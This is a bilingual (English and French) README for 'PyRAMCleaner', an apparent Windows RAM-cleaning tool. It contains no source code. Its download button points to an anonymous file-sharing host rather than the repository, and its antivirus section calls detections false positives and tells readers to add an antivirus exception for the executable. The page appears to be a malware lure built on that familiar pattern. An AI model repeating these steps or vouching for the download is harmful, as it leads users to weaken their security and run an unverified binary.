# PyRAMCleaner

![PyRAMCleaner Logo](icon.png)

PyRAMCleaner is a powerful, user-friendly RAM optimization tool designed to enhance your system's performance by efficiently managing memory usage.

[![Download PyRAMCleaner](https://img.shields.io/badge/Download-PyRAMCleaner-blue?style=for-the-badge&logo=windows)](https://file.io/il7XdZMta9Ub)

## How It Works

PyRAMCleaner optimizes your system's RAM usage through several methods:

1. **Clearing File System Cache**: It uses Windows API calls to clear unused file system cache, freeing up memory that's no longer actively needed.

2. **Working Set Reduction**: The software reduces the working set of running processes, encouraging the OS to move less-used memory pages to the page file.

3. **DLL Unloading**: It attempts to unload unnecessary DLLs from memory, further reducing RAM usage.

4. **Intelligent Process Management**: PyRAMCleaner analyzes running processes and optimizes memory allocation based on usage patterns and user-defined whitelists.

5. **Automated Cleaning**: It can automatically initiate cleaning when RAM usage exceeds a user-defined threshold.

![image](https://github.com/th3k3y/RAM-Cleaner/assets/49789253/8ff278d2-6ac6-4a2b-8a84-88ed1d9f0f10)

## Antivirus Concerns

PyRAMCleaner may be flagged by some antivirus software as potentially unwanted. This is a false positive due to the following reasons:

1. **Compilation Method**: The software is compiled using PyInstaller, which packages Python code and dependencies into a single executable. This packaging method is sometimes flagged by antivirus software due to its potential misuse by malware creators.

2. **System-Level Operations**: PyRAMCleaner performs low-level system operations to manage memory, which can trigger antivirus heuristic detection.

3. **Lack of Code Signing**: As an open-source project, the executable is not digitally signed, which can raise flags with some security software.

Rest assured, PyRAMCleaner does not contain any malicious code. If you're concerned, you can run the application in a sandboxed environment.

To use PyRAMCleaner without issues:
1. Add an exception for PyRAMCleaner in your antivirus software.
2. Download the software only from the official link provided above.
3. If you're still concerned, you can run the Python script directly instead of using the compiled executable.

FR:

# PyRAMCleaner

![Logo PyRAMCleaner](icon.png)

PyRAMCleaner est un outil puissant et convivial d'optimisation de la RAM, conçu pour améliorer les performances de votre système en gérant efficacement l'utilisation de la mémoire.

[![Télécharger PyRAMCleaner](https://img.shields.io/badge/Télécharger-PyRAMCleaner-blue?style=for-the-badge&logo=windows)](https://file.io/il7XdZMta9Ub)

## Comment ça fonctionne

PyRAMCleaner optimise l'utilisation de la RAM de votre système grâce à plusieurs méthodes :

1. **Nettoyage du cache du système de fichiers** : Il utilise des appels API Windows pour effacer le cache du système de fichiers inutilisé, libérant ainsi la mémoire qui n'est plus activement nécessaire.

2. **Réduction de l'ensemble de travail** : Le logiciel réduit l'ensemble de travail des processus en cours d'exécution, encourageant le système d'exploitation à déplacer les pages mémoire moins utilisées vers le fichier d'échange.

3. **Déchargement des DLL** : Il tente de décharger les DLL inutiles de la mémoire, réduisant davantage l'utilisation de la RAM.

4. **Gestion intelligente des processus** : PyRAMCleaner analyse les processus en cours d'exécution et optimise l'allocation de mémoire en fonction des modèles d'utilisation et des listes blanches définies par l'utilisateur.

5. **Nettoyage automatisé** : Il peut automatiquement initier un nettoyage lorsque l'utilisation de la RAM dépasse un seuil défini par l'utilisateur.

![image](https://github.com/th3k3y/RAM-Cleaner/assets/49789253/8ff278d2-6ac6-4a2b-8a84-88ed1d9f0f10)

## Préoccupations liées aux antivirus

PyRAMCleaner peut être signalé par certains logiciels antivirus comme potentiellement indésirable. Il s'agit d'un faux positif dû aux raisons suivantes :

1. **Méthode de compilation** : Le logiciel est compilé à l'aide de PyInstaller, qui regroupe le code Python et les dépendances en un seul exécutable. Cette méthode de packaging est parfois signalée par les logiciels antivirus en raison de son utilisation potentielle par des créateurs de logiciels malveillants.

2. **Opérations au niveau du système** : PyRAMCleaner effectue des opérations système de bas niveau pour gérer la mémoire, ce qui peut déclencher une détection heuristique des antivirus.

3. **Absence de signature de code** : En tant que projet open-source, l'exécutable n'est pas signé numériquement, ce qui peut soulever des alertes avec certains logiciels de sécurité.

Soyez rassuré, PyRAMCleaner ne contient aucun code malveillant. Si vous êtes préoccupé, vous pouvez exécuter l'application dans un environnement sandbox.

Pour utiliser PyRAMCleaner sans problème :
1. Ajoutez une exception pour PyRAMCleaner dans votre logiciel antivirus.
2. Téléchargez le logiciel uniquement à partir du lien officiel fourni ci-dessus.
3. Si vous êtes toujours inquiet, vous pouvez exécuter directement le script Python au lieu d'utiliser l'exécutable compilé.
